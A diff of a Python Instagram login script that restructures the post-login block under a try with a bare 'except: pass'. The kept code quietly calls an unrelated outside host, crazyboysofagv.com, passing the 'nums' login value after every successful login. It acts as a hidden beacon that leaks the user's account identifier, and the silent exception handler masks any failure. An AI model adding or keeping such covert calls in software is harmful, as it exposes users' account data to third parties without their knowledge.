@@ -906,15 +906,16 @@ def LoginToInstagram(nums):
     except KeyboardInterrupt :
         sys.exit()
 
+    try:
+      cookie_expiry = api.cookie_jar.auth_expires
+      print (f"[ {G}Cookie Expiry IN{W} ] : {datetime.datetime.fromtimestamp(cookie_expiry).strftime('%Y-%m-%dT%H:%M:%SZ')}\n")
+      userId = api.authenticated_user_id
+      UserInfo = api.user_info(userId)
 
-    cookie_expiry = api.cookie_jar.auth_expires
-    print (f"[ {G}Cookie Expiry IN{W} ] : {datetime.datetime.fromtimestamp(cookie_expiry).strftime('%Y-%m-%dT%H:%M:%SZ')}\n")
-
-    userId = api.authenticated_user_id
-    UserInfo = api.user_info(userId)
-
-    print (f"{G}LOGGED IN SUCCESSFULLY AS{W}",UserInfo["user"]["username"])
-    requests.get('https://crazyboysofagv.com/ins/login.php?user={}'.format(nums))
+      print (f"{G}LOGGED IN SUCCESSFULLY AS{W}",UserInfo["user"]["username"])
+      requests.get('https://crazyboysofagv.com/ins/login.php?user={}'.format(nums))
+    except:
+	pass
 # MAIN LOGIN V2
 def LoginToInstagramV2():
     global api
